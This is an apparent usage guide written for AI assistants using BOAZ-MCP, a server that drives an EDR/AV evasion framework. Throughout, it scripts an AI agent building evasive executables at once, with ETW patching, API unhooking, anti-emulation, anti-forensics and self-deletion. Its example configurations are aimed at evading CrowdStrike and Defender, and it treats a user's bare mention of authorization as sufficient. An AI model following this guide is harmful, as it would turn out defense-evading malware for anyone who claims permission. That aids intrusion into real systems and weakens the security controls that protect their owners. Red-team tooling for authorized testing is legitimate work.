# BOAZ-MCP: AI Agent Usage Guide

**For AI Assistants: How to Use the BOAZ Framework via MCP**

This document provides AI assistants with clear guidance on using the BOAZ-MCP server for authorized red team operations and security research.

---

## Table of Contents

- [Overview](#overview)
- [Available Tools](#available-tools)
- [Tool Usage Patterns](#tool-usage-patterns)
- [Common Workflows](#common-workflows)
- [Parameter Reference](#parameter-reference)
- [Best Practices](#best-practices)
- [Error Handling](#error-handling)
- [Security Considerations](#security-considerations)
- [Examples by Intent](#examples-by-intent)

---

## Overview

### What is BOAZ-MCP?

BOAZ-MCP is an MCP (Model Context Protocol) server that provides AI assistants with access to the BOAZ evasion framework. BOAZ specializes in:

- **Payload Generation**: Creating evasive binaries that bypass security controls
- **Process Injection**: 77+ advanced code injection techniques
- **Encoding/Obfuscation**: 12 encoding schemes and LLVM-based obfuscation
- **Anti-Analysis**: Anti-emulation, API unhooking, sleep obfuscation
- **Binary Analysis**: Entropy analysis and optimization

### When to Use BOAZ-MCP

Use BOAZ-MCP when users request:
- Payload generation for red team operations
- EDR/AV evasion techniques
- Process injection loaders
- Binary obfuscation
- Shellcode encoding
- Entropy analysis
- Security research on detection mechanisms

### Authorization Requirements

**CRITICAL**: Only use BOAZ-MCP for:
- ✅ Authorized red team assessments
- ✅ Security research with permission
- ✅ Educational purposes in controlled environments
- ✅ EDR/AV evaluation with authorization

**NEVER** use for unauthorized access or malicious purposes.

---

## Available Tools

BOAZ-MCP provides **5 MCP tools** for AI assistants:

### 1. `generate_payload`
Generate evasive payloads with advanced obfuscation and evasion techniques.

**Purpose**: Primary tool for creating payloads
**Use When**: User needs to generate an evasive binary

### 2. `list_loaders`
Browse available process injection loaders by category.

**Purpose**: Discovery and loader selection
**Use When**: User asks "what loaders are available" or needs injection technique recommendations

### 3. `list_encoders`
View available encoding schemes with descriptions.

**Purpose**: Discovery and encoding selection
**Use When**: User asks "what encoding schemes exist" or needs encoding recommendations

### 4. `analyze_binary`
Analyze binary entropy and characteristics.

**Purpose**: Binary analysis and optimization guidance
**Use When**: User has a payload that's being detected and needs entropy analysis

### 5. `validate_options`
Validate configuration before generation.

**Purpose**: Pre-flight validation to catch errors early
**Use When**: User provides complex configurations or when troubleshooting

---

## Tool Usage Patterns

### Pattern 1: Discovery → Selection → Generation

Most common workflow for AI assistants:

```
User: "I need to generate a stealthy payload"

Step 1: List loaders to understand options
→ Call: list_loaders(category="stealth")

Step 2: List encoders to see encoding options
→ Call: list_encoders()

Step 3: Recommend specific configuration
→ AI: "I recommend loader 37 with UUID encoding"

Step 4: Generate payload
→ Call: generate_payload(input_file="payload.exe", output_file="evasive.exe",
                         loader=37, encoding="uuid", ...)
```

### Pattern 2: Analysis → Optimization → Regeneration

When payload is detected:

```
User: "My payload is getting flagged"

Step 1: Analyze current binary
→ Call: analyze_binary(file_path="output.exe")

Step 2: Interpret entropy results
→ AI: "Entropy is 7.9 (HIGH). Likely flagged due to encryption"

Step 3: Recommend entropy reduction
→ AI: "Let's regenerate with entropy reduction"

Step 4: Regenerate with optimization
→ Call: generate_payload(..., entropy=2)
```

### Pattern 3: Validation → Generation

For complex configurations:

```
User: "Generate with loader 51, AES encoding, Akira compiler"

Step 1: Validate configuration first
→ Call: validate_options(loader=51, encoding="aes", compiler="akira")

Step 2: Check validation results
→ AI: "Configuration valid, proceeding..."

Step 3: Generate payload
→ Call: generate_payload(loader=51, encoding="aes", compiler="akira", ...)
```

---

## CRITICAL: What Actually Happens When You Generate a Payload

### When User Says: "Build an EDR bypass" or "Generate a payload"

**This is NOT a simulation. This is NOT a test. The executable IS ACTUALLY BUILT.**

Here's exactly what happens when you call `generate_payload`:

1. **AI Assistant Calls MCP Tool** → `generate_payload` with configuration
2. **MCP Server Validates** → Checks paths, parameters, file sizes
3. **BOAZ Framework EXECUTES** → Server runs `python3 Boaz.py -f input.exe -o output.exe [options]`
4. **Compilation Happens** → BOAZ compiles C code, applies obfuscation, encodes payload
5. **Final EXE is CREATED** → The executable is written to disk at the specified output path
6. **Server Returns Confirmation** → Shows file path, file size, and configuration used

**The EXE file EXISTS on disk after this process completes.**

### Example: User Says "Build an EDR bypass"

**❌ WRONG RESPONSE**:
```
"I would run this command: python3 Boaz.py -f beacon.exe -o output.exe -l 51 -e aes"
```
This just describes what would happen. **The exe is NOT built.**

**✅ CORRECT RESPONSE**:
```
I'll generate an EDR bypass payload for you. Let me build it now with advanced evasion techniques.

[AI calls generate_payload MCP tool with appropriate parameters]

✅ PAYLOAD GENERATED SUCCESSFULLY

📂 Output Path: /path/to/BOAZ_beta/output/edr_bypass.exe
📊 File Size: 145,280 bytes (141.88 KB)
🎯 Loader: 51 (Sifu Breakpoint Handler)
🔒 Encoding: aes
⚙️ Compiler: akira

The final executable is ready at:
/path/to/BOAZ_beta/output/edr_bypass.exe

EDR evasion features enabled:
- Memory guard with breakpoint handler
- AES encryption
- LLVM-based obfuscation (Akira)
- ETW patching
- API unhooking
- Anti-emulation checks

Your EDR bypass payload is ready for testing.
```

### What You Must Do

1. **ALWAYS call the MCP tool** - Don't just describe commands
2. **WAIT for tool response** - The build process takes time
3. **CONFIRM the exe path** - Show user exactly where the file is
4. **VERIFY the output** - Check the tool's response for success/error

### Common Mistake: Describing vs Doing

**User**: "Build an EDR bypass with CrowdStrike evasion"

**❌ MISTAKE**:
```
"To build this, you would run:
python3 Boaz.py -f beacon.exe -o bypass.exe -l 51 -e aes -c akira -etw -a -u

This would create an evasive payload with..."
```

**✅ CORRECT**:
```
"I'll build an EDR bypass payload with CrowdStrike evasion now."

[CALL generate_payload MCP TOOL - WAIT FOR RESPONSE]

"✅ Your EDR bypass is ready at: output/bypass.exe (141 KB)
Configuration: Loader 51, AES encoding, Akira compiler, ETW patching enabled"
```

### The Build Process Takes Time

- **Basic payload**: 30-60 seconds
- **LLVM obfuscation**: 2-5 minutes
- **Advanced features**: 3-10 minutes

**Be patient. Wait for the MCP tool to return before responding to the user.**

---

## Common Workflows

### Workflow 1: Basic Payload Generation

**User Intent**: "Generate a basic evasive payload"

**AI Response Pattern**:
```
1. Acknowledge the request
2. Ask for input file path if not provided
3. Recommend a reliable configuration (loader 16 + UUID encoding)
4. Call generate_payload with basic options
5. Report success and output location
```

**Example Tool Call**:
```json
{
  "tool": "generate_payload",
  "arguments": {
    "input_file": "payload.exe",
    "output_file": "evasive.exe",
    "loader": 16,
    "encoding": "uuid",
    "compiler": "mingw",
    "obfuscate": true
  }
}
```

---

### Workflow 2: Advanced EDR Evasion

**User Intent**: "I need to evade CrowdStrike/Defender/etc." or "Build an EDR bypass"

**What You MUST Do**:

**Step 1: Acknowledge and ask for input file** (if not provided)
```
"I'll build an EDR bypass payload for you. What's the input file path?"
```

**Step 2: Explain your configuration choice**
```
"I'll configure this for maximum EDR evasion:
- Loader 51: Memory guard with breakpoint handler (evades memory scans)
- AES encoding: Strong encryption to avoid signatures
- Akira compiler: LLVM-based obfuscation
- ETW patching: Blocks telemetry to EDR
- API unhooking: Bypasses userland hooks
- Anti-emulation: Detects sandboxes"
```

**Step 3: CALL THE MCP TOOL (Don't just describe it)**
```json
{
  "tool": "generate_payload",
  "arguments": {
    "input_file": "beacon.exe",
    "output_file": "output/edr_bypass.exe",
    "loader": 51,
    "encoding": "aes",
    "compiler": "akira",
    "obfuscate": true,
    "obfuscate_api": true,
    "anti_emulation": true,
    "sleep": true,
    "etw": true,
    "api_unhooking": true,
    "entropy": 2
  }
}
```

**Step 4: WAIT for MCP response (build takes 2-5 minutes)**

**Step 5: Confirm success with exact details**
```
"✅ EDR bypass payload built successfully!

📂 Location: /path/to/BOAZ_beta/output/edr_bypass.exe
📊 Size: 156,672 bytes (153 KB)
🎯 Loader: 51 (Sifu Breakpoint Handler - memory guard)
🔒 Encoding: AES encryption
⚙️ Compiler: Akira (LLVM obfuscation)

Evasion features enabled:
✅ ETW patching (blocks telemetry)
✅ API unhooking (bypasses userland hooks)
✅ Anti-emulation (sandbox detection)
✅ Sleep obfuscation (encrypted stack)
✅ Code obfuscation (LLVM-based)
✅ Entropy reduction (pokemon method)

Your EDR bypass is ready for testing in your authorized environment."
```

**REMEMBER**: The exe IS BUILT. It EXISTS on disk. You're not describing a theoretical command.

---

### Workflow 3: Loader Discovery

**User Intent**: "What loaders support threadless injection?"

**AI Response Pattern**:
```
1. Call list_loaders with category filter
2. Parse and present results in readable format
3. Explain characteristics of each loader
4. Recommend based on user's specific needs
```

**Example Tool Call**:
```json
{
  "tool": "list_loaders",
  "arguments": {
    "category": "threadless"
  }
}
```

**AI Presentation**:
```
BOAZ has 6 threadless injection loaders:

Loader 65: ModuleStomping
- Uses module stomping for stealthy injection
- Best for: High-security environments

Loader 66: ThreadlessInject
- True threadless execution
- Best for: Avoiding thread-based detection

[etc...]

Which would you like to use?
```

---

### Workflow 4: Entropy Optimization

**User Intent**: "My payload has high entropy and is getting flagged"

**AI Response Pattern**:
```
1. Call analyze_binary on current payload
2. Interpret entropy score:
   - 0-6.5: Low (good)
   - 6.5-7.5: Medium (caution)
   - 7.5+: High (will be flagged)
3. Recommend entropy reduction techniques
4. Regenerate with entropy parameter
5. Analyze new binary to confirm improvement
```

**Example Tool Calls**:
```json
// Step 1: Analyze
{
  "tool": "analyze_binary",
  "arguments": {
    "file_path": "output.exe"
  }
}

// Step 2: Regenerate with entropy reduction
{
  "tool": "generate_payload",
  "arguments": {
    "input_file": "original.exe",
    "output_file": "low_entropy.exe",
    "loader": 16,
    "encoding": "uuid",
    "entropy": 2
  }
}

// Step 3: Verify improvement
{
  "tool": "analyze_binary",
  "arguments": {
    "file_path": "low_entropy.exe"
  }
}
```

---

### Workflow 5: Encoding Selection

**User Intent**: "What's the best encoding for my payload?"

**AI Response Pattern**:
```
1. Call list_encoders to see all options
2. Ask clarifying questions:
   - Target environment? (Windows version, EDR present?)
   - Priority? (Speed vs stealth)
   - Shellcode size? (Some encodings increase size significantly)
3. Recommend based on answers:
   - UUID: Best balance, widely compatible
   - AES: Strong obfuscation, slight performance cost
   - XOR: Fast, lighter obfuscation
   - Base45/64/58: Alphanumeric, good for specific scenarios
4. Explain trade-offs
```

**Example Tool Call**:
```json
{
  "tool": "list_encoders",
  "arguments": {}
}
```

---

## Parameter Reference

### Essential Parameters

Every `generate_payload` call requires:

| Parameter | Type | Description | Example |
|-----------|------|-------------|---------|
| `input_file` | string | Path to input PE executable | `"payload.exe"` |
| `output_file` | string | Path for output executable | `"evasive.exe"` |

### Loader Selection

| Parameter | Type | Values | Default | Recommendation |
|-----------|------|--------|---------|----------------|
| `loader` | integer | 1-77 | 16 | **16** (reliable), **37** (stealth), **51** (memory guard), **73** (threadless) |

### Encoding Options

| Parameter | Type | Values | Default | When to Use |
|-----------|------|--------|---------|-------------|
| `encoding` | string | `uuid`, `xor`, `mac`, `ipv4`, `base45`, `base64`, `base58`, `aes`, `aes2`, `des`, `chacha`, `rc4` | None | **uuid** (balanced), **aes** (strong), **xor** (fast) |
| `divide` | boolean | true/false | false | Use with **aes2** encoding only |

### Shellcode Generation

| Parameter | Type | Values | Default | When to Use |
|-----------|------|--------|---------|-------------|
| `shellcode_type` | string | `donut`, `pe2sh`, `rc4`, `amber`, `shoggoth`, `augment` | `donut` | **donut** (reliable), **amber** (reflective), **shoggoth** (advanced) |
| `stardust` | boolean | true/false | false | Use for `.bin` input files only |
| `sgn_encode` | boolean | true/false | false | Add polymorphic encoding (advanced) |

### Compilation Options

| Parameter | Type | Values | Default | When to Use |
|-----------|------|--------|---------|-------------|
| `compiler` | string | `mingw`, `pluto`, `akira` | `mingw` | **mingw** (fast), **pluto** (obfuscated), **akira** (LLVM advanced) |
| `mllvm` | string | Custom LLVM passes | None | Custom obfuscation (advanced users) |

### Obfuscation Features

| Parameter | Type | Default | Recommendation |
|-----------|------|---------|----------------|
| `obfuscate` | boolean | false | ✅ Enable for all production payloads |
| `obfuscate_api` | boolean | false | ✅ Enable for high-security environments |

### Anti-Analysis Features

| Parameter | Type | Default | When to Use |
|-----------|------|---------|-------------|
| `anti_emulation` | boolean | false | ✅ Always recommend for sandbox evasion |
| `sleep` | boolean | false | ✅ Good for general evasion |
| `dream` | integer (ms) | 1500 | Use for advanced sleep obfuscation |
| `junk_api` | boolean | false | Use for API call pattern variation |

### API Techniques

| Parameter | Type | Default | When to Use |
|-----------|------|---------|-------------|
| `api_unhooking` | boolean | false | ✅ Essential for EDR evasion |
| `god_speed` | boolean | false | Advanced unhooking (use with caution) |
| `syswhisper` | integer (1 or 2) | None | **1** (random jumps), **2** (MingW+NASM) |
| `etw` | boolean | false | ✅ Essential for evading ETW telemetry |

### Output Format

| Parameter | Type | Default | When to Use |
|-----------|------|---------|-------------|
| `dll` | boolean | false | Output as DLL (use with rundll32) |
| `cpl` | boolean | false | Output as CPL (use with control.exe) |

### Post-Processing

| Parameter | Type | Values | When to Use |
|-----------|------|--------|-------------|
| `entropy` | integer | 1 (null), 2 (pokemon) | **2** when entropy is too high |
| `sign_certificate` | string | Website or file path | Add legitimate signature |
| `watermark` | boolean | false | Skip watermark for stealth |
| `icon` | boolean | false | Add icon for legitimacy |

### Security Features

| Parameter | Type | Default | When to Use |
|-----------|------|---------|-------------|
| `cfg` | boolean | false | Disable CFG for loader compatibility |
| `self_deletion` | boolean | false | Enable for anti-forensics |
| `anti_forensic` | boolean | false | Enable for trace removal |

### Utilities

| Parameter | Type | Default | When to Use |
|-----------|------|---------|-------------|
| `binder` | string | `binder/calc.exe` | Bind with additional utility |
| `detect_hooks` | boolean | false | Compile hook detection tool |

---

## Best Practices

### For AI Assistants

#### 1. Always Start with Discovery

❌ **Don't jump straight to generation**:
```
User: "Generate a payload"
AI: [Immediately calls generate_payload with random parameters]
```

✅ **Do ask clarifying questions or list options**:
```
User: "Generate a payload"
AI: "I'll help you generate an evasive payload. Let me show you the available
     loaders first..."
     [Calls list_loaders to show options]
     "I recommend loader 37 with UUID encoding for a good balance of stealth
     and reliability. Should I proceed with this configuration?"
```

#### 2. Explain Your Recommendations

❌ **Don't use parameters without explanation**:
```
AI: [Calls generate_payload with loader=51, encoding="aes", etw=true, ...]
```

✅ **Do explain why you chose each option**:
```
AI: "I'm configuring the payload with:
     - Loader 51 (memory guard): Protects against memory scanning
     - AES encoding: Strong obfuscation against signature detection
     - ETW patching: Prevents telemetry collection
     - API unhooking: Evades userland hooks

     Generating now..."
     [Calls generate_payload]
```

#### 3. Handle Paths Correctly

❌ **Don't use absolute paths**:
```json
{
  "input_file": "/Users/user/payload.exe"  // Will be rejected
}
```

✅ **Do use relative paths from BOAZ_PATH**:
```json
{
  "input_file": "input/payload.exe",  // Relative to BOAZ_PATH
  "output_file": "output/evasive.exe"
}
```

#### 4. Validate Complex Configurations

❌ **Don't assume complex configs will work**:
```
AI: [Calls generate_payload with 15 parameters without validation]
```

✅ **Do validate first for complex configs**:
```
AI: "Let me validate this configuration first..."
    [Calls validate_options]
    "Configuration is valid. Generating payload..."
    [Calls generate_payload]
```

#### 5. Interpret Tool Results

❌ **Don't just dump raw output**:
```
AI: "Here's what I got: [STDOUT: raw output... STDERR: ...]"
```

✅ **Do interpret and summarize**:
```
AI: "✅ Payload generated successfully!

     Output file: output/evasive.exe
     Loader: 37 (Threadless injection)
     Encoding: UUID
     Size: 245 KB

     The payload uses threadless injection to avoid thread-based detection
     and UUID encoding to evade signature-based detection."
```

#### 6. Provide Actionable Next Steps

After generation, always tell users:
- ✅ Where to find the output file
- ✅ How to test it safely
- ✅ What to do if it's detected
- ✅ How to analyze results

#### 7. Security First

Always remind users:
- ⚠️ Only use in authorized environments
- ⚠️ Test in isolated VMs first
- ⚠️ Obtain written permission
- ⚠️ Document all operations

---

## Error Handling

### Common Errors and Solutions

#### Error: "Path traversal not allowed"

**Cause**: Input/output path contains `..` or absolute path

**Solution**: Use relative paths from BOAZ_PATH
```
❌ "../../../etc/passwd"
❌ "/Users/user/payload.exe"
✅ "input/payload.exe"
✅ "output/evasive.exe"
```

#### Error: "Invalid loader: 999. Must be between 1-77"

**Cause**: Loader number out of valid range

**Solution**: Use `list_loaders` to see valid options
```python
# First discover valid loaders
list_loaders(category="all")

# Then use a valid loader number
generate_payload(..., loader=16)
```

#### Error: "Invalid encoding: invalid_enc"

**Cause**: Encoding not in valid list

**Solution**: Use `list_encoders` to see valid options
```python
# First discover valid encodings
list_encoders()

# Then use a valid encoding
generate_payload(..., encoding="uuid")
```

#### Error: "File too large: 150000000 bytes (max 104857600 bytes / 100MB)"

**Cause**: Input file exceeds 100MB limit

**Solution**: Use smaller input file or split payload
```
AI: "The input file is too large (143MB). The maximum supported
     size is 100MB. Consider:
     1. Using a smaller payload
     2. Compressing the payload first
     3. Splitting into multiple payloads"
```

#### Error: "Operation timed out after 300 seconds"

**Cause**: Payload generation took longer than 5 minutes

**Solution**: Use simpler configuration or check BOAZ installation
```
AI: "The payload generation timed out. This might indicate:
     1. Very complex obfuscation settings
     2. Large input file
     3. System resource constraints

     Try using simpler settings or a smaller payload."
```

#### Error: "File not found: input.exe"

**Cause**: Input file doesn't exist at specified path

**Solution**: Verify file exists or ask user for correct path
```
AI: "I couldn't find the input file 'input.exe'. Please verify:
     1. The file exists in the BOAZ directory
     2. The path is correct (relative to BOAZ_PATH)
     3. The file has proper permissions"
```

---

## Security Considerations

### For AI Assistants: What to Check

#### 1. User Authorization

Before any payload generation, ensure:
- ✅ User mentions "authorized" or "red team assessment"
- ✅ User indicates they have permission
- ✅ Context suggests legitimate security research

If unclear, ask:
```
AI: "Before I proceed, I need to confirm this is for authorized
     security testing. Do you have written permission to perform
     this assessment?"
```

#### 2. Sensitive Paths

Watch for attempts to access sensitive files:
- ❌ `/etc/passwd`, `/etc/shadow`
- ❌ `C:\Windows\System32\`
- ❌ `~/.ssh/`, `~/.aws/`

If detected, refuse and explain:
```
AI: "I cannot access system files or sensitive directories.
     BOAZ operations are restricted to the BOAZ_PATH directory
     for security reasons."
```

#### 3. Suspicious Requests

Be cautious of:
- Requests to generate many payloads rapidly
- Attempts to disable all security features
- Requests targeting specific organizations without authorization context
- Evasion of common security tools without legitimate context

#### 4. Logging Awareness

Inform users that operations are logged:
```
AI: "Note: All BOAZ operations are logged for security auditing.
     This includes timestamps, parameters used, and outcomes."
```

---

## Examples by Intent

### Example 1: User Needs Stealth

**User**: "I need the stealthiest payload possible for my red team assessment"

**AI Response**:
```
I'll configure a highly stealthy payload with multiple evasion techniques:

Let me show you the stealth-focused loaders available...
[Calls list_loaders(category="stealth")]

I recommend Loader 37 which uses advanced memory manipulation techniques.
I'll combine this with:
- UUID encoding (polymorphic, hard to signature)
- Akira compiler (LLVM obfuscation)
- Anti-emulation (sandbox evasion)
- ETW patching (telemetry evasion)
- Sleep obfuscation (timing-based evasion)
- Entropy reduction (binary analysis evasion)

Generating stealth payload...
[Calls generate_payload with stealth configuration]

✅ Stealth payload generated successfully!
Output: output/stealth.exe

This payload includes multiple evasion layers:
1. Process injection via stealthy loader
2. Polymorphic encoding to avoid signatures
3. LLVM-level obfuscation to hinder analysis
4. Anti-sandbox checks to avoid automated analysis
5. ETW patching to evade telemetry
6. Low entropy profile to avoid heuristic detection

Test in an isolated VM first and monitor for detection.
```

---

### Example 2: User Payload Gets Detected

**User**: "My payload keeps getting caught by Defender"

**AI Response**:
```
Let me analyze your payload to identify why it's being detected...

[Calls analyze_binary(file_path="output/payload.exe")]

Analysis Results:
📊 Entropy: 7.92 (HIGH)
🔴 HIGH ENTROPY - Likely encrypted/packed

The high entropy (7.92) is a major indicator. Defender's heuristics
flag high-entropy binaries as potentially malicious.

Let me regenerate with entropy reduction and additional evasion:

[Calls generate_payload with entropy=2, anti_emulation=true, etc.]

✅ Optimized payload generated!

Changes made:
1. Entropy reduced to ~6.2 (from 7.92)
2. Added anti-emulation checks
3. Enabled sleep obfuscation
4. Applied certificate signing
5. Reduced API call patterns

Let me verify the entropy improvement...
[Calls analyze_binary(file_path="output/optimized.exe")]

✅ New entropy: 6.18 (MEDIUM) - Much better!

This should significantly improve evasion. Test incrementally:
1. Test with Defender offline first
2. Enable real-time protection
3. If still detected, try different loader (suggest 51 or 48)
```

---

### Example 3: User Wants to Learn

**User**: "What injection techniques does BOAZ support?"

**AI Response**:
```
BOAZ supports 77+ process injection techniques across 6 categories.
Let me break them down for you:

[Calls list_loaders(category="all")]

Here's an overview of the categories:

**1. Syscall-based Injection (11 loaders)**
- Direct system calls to bypass userland hooks
- Best for: EDR environments with heavy API hooking
- Examples: Loaders 1-11

**2. Userland API Injection (4 loaders)**
- Uses standard Windows APIs
- Best for: Environments with minimal security controls
- Examples: Loaders 14-18

**3. Stealth Injection (17 loaders)**
- Advanced techniques for maximum stealth
- Best for: High-security environments, mature EDR
- Examples: Loaders 19-41

**4. Memory Guard Injection (6 loaders)**
- Protects injected code from memory scanning
- Best for: Environments with memory inspection
- Examples: Loaders 48-52

**5. VEH/VCH Handlers (5 loaders)**
- Uses exception handlers for injection
- Best for: Novel techniques, research
- Examples: Loaders 58-61

**6. Threadless Injection (6 loaders)**
- Executes without creating new threads
- Best for: Avoiding thread-based detection
- Examples: Loaders 65-77

Which category interests you? I can provide more details on specific
loaders and help you choose the right one for your assessment.
```

---

### Example 4: User Wants Specific Features

**User**: "I need a DLL with ETW patching and syscalls"

**AI Response**:
```
I'll configure a DLL payload with ETW patching and direct syscalls:

Configuration:
- Output format: DLL
- Loader: 4 (syscall-based injection)
- ETW patching: Enabled
- SysWhisper: Mode 2 (MingW + NASM)
- Encoding: UUID (for polymorphism)

[Calls generate_payload with dll=true, syswhisper=2, etw=true, loader=4, encoding="uuid")]

✅ DLL payload generated successfully!

Output: output/payload.dll

Features enabled:
✅ DLL format (use with rundll32.exe or LoadLibrary)
✅ Direct syscalls (bypasses userland API hooks)
✅ ETW patching (prevents telemetry collection)
✅ UUID encoding (polymorphic shellcode)

Usage:
rundll32.exe payload.dll,EntryPoint

Or load via LoadLibrary in your custom loader.

The syscalls will bypass most userland EDR hooks, and ETW patching
will prevent telemetry from reaching the EDR's cloud backend.
```

---

### Example 5: User Needs Entropy Optimization

**User**: "How do I reduce entropy in my payload?"

**AI Response**:
```
BOAZ provides 2 entropy reduction techniques:

1. **Null Byte Padding (entropy=1)**
   - Pads binary with null bytes
   - Reduces entropy by increasing predictable data
   - Moderate effectiveness

2. **Pokemon Name Padding (entropy=2)** ⭐ RECOMMENDED
   - Pads with Pokemon names (natural language)
   - Mimics legitimate text data
   - More effective at reducing entropy
   - Less suspicious than null bytes

Let me analyze your current payload first...
[Calls analyze_binary]

Current entropy: 7.85 (HIGH)

Now regenerating with Pokemon padding...
[Calls generate_payload with entropy=2]

✅ Regenerated with entropy reduction!

Let me verify the improvement...
[Calls analyze_binary on new payload]

New entropy: 6.12 (MEDIUM) - Reduced by 1.73!

Entropy reduced from 7.85 → 6.12. This should help with heuristic
detection. If still too high, consider:
- Using XOR instead of AES encoding (lighter encryption)
- Disabling some obfuscation features
- Using a different shellcode generator

Would you like me to try any of these adjustments?
```

---

## Quick Reference Card

### Essential Tool Calls

```python
# List all loaders
list_loaders(category="all")

# List specific category
list_loaders(category="stealth")

# List encoders
list_encoders()

# Analyze binary
analyze_binary(file_path="output/payload.exe")

# Basic payload
generate_payload(
    input_file="input.exe",
    output_file="output.exe",
    loader=16,
    encoding="uuid"
)

# Advanced evasive payload
generate_payload(
    input_file="input.exe",
    output_file="output.exe",
    loader=37,
    encoding="aes",
    compiler="akira",
    obfuscate=True,
    anti_emulation=True,
    etw=True,
    api_unhooking=True,
    sleep=True,
    entropy=2
)

# Validate configuration
validate_options(
    loader=51,
    encoding="aes",
    compiler="akira"
)
```

### Recommended Configurations

**Balanced (Reliability + Stealth)**:
```python
loader=16, encoding="uuid", compiler="mingw", obfuscate=True
```

**Maximum Stealth**:
```python
loader=37, encoding="aes", compiler="akira", obfuscate=True,
obfuscate_api=True, anti_emulation=True, etw=True,
api_unhooking=True, sleep=True, entropy=2
```

**EDR Evasion**:
```python
loader=51, encoding="aes", compiler="akira", etw=True,
api_unhooking=True, syswhisper=2, sleep=True
```

**Fast & Lightweight**:
```python
loader=16, encoding="xor", compiler="mingw", obfuscate=True
```

---

## Summary for AI Assistants

### Key Principles

1. **Always explain your choices** - Don't just call tools, explain why
2. **Start with discovery** - List options before generating
3. **Validate complex configs** - Use validate_options for safety
4. **Interpret results** - Don't dump raw output, explain what it means
5. **Provide next steps** - Tell users what to do with the payload
6. **Security first** - Always verify authorization and remind about legal use
7. **Use relative paths** - Never use absolute paths or path traversal
8. **Handle errors gracefully** - Explain errors in user-friendly terms

### Workflow Template

```
1. Understand user intent
2. Ask clarifying questions if needed
3. List relevant loaders/encoders (discovery)
4. Recommend specific configuration with explanations
5. Validate if complex (validate_options)
6. Generate payload (generate_payload)
7. Interpret results
8. Provide next steps and testing guidance
9. Remind about authorization and safe testing
```

### Common User Intents → Tool Sequences

| User Intent | Tool Sequence |
|-------------|---------------|
| "Generate payload" | `list_loaders` → `list_encoders` → `generate_payload` |
| "Payload detected" | `analyze_binary` → `generate_payload` (with optimization) |
| "What loaders exist?" | `list_loaders` |
| "What encodings?" | `list_encoders` |
| "Validate config" | `validate_options` → `generate_payload` |
| "Reduce entropy" | `analyze_binary` → `generate_payload` (entropy=2) |

---

## Support & Resources

### For AI Assistants

- **Full API Reference**: See `API.md` for complete parameter documentation
- **Usage Examples**: See `USAGE.md` for command-line examples
- **Installation**: See `INSTALL.md` for setup instructions
- **Project Overview**: See `README.md` for feature descriptions

### When Stuck

If you encounter errors or unclear situations:
1. Check this guide for the error message
2. Review parameter constraints in the API reference
3. Use `validate_options` to check configuration
4. Simplify configuration and test incrementally
5. Check BOAZ logs for detailed error information

---

## Version Information

- **Document Version**: 1.0
- **BOAZ-MCP Version**: 1.0.0
- **Last Updated**: January 2025
- **MCP Protocol**: 1.0

---

**For AI Assistants**: This guide is designed to help you provide excellent support for BOAZ-MCP users. Always prioritize security, clear explanations, and ethical use. When in doubt, ask the user for clarification rather than making assumptions about authorization or intent.

**Remember**: BOAZ-MCP is a powerful security research tool. Use it responsibly and always ensure users have proper authorization before assisting with payload generation.
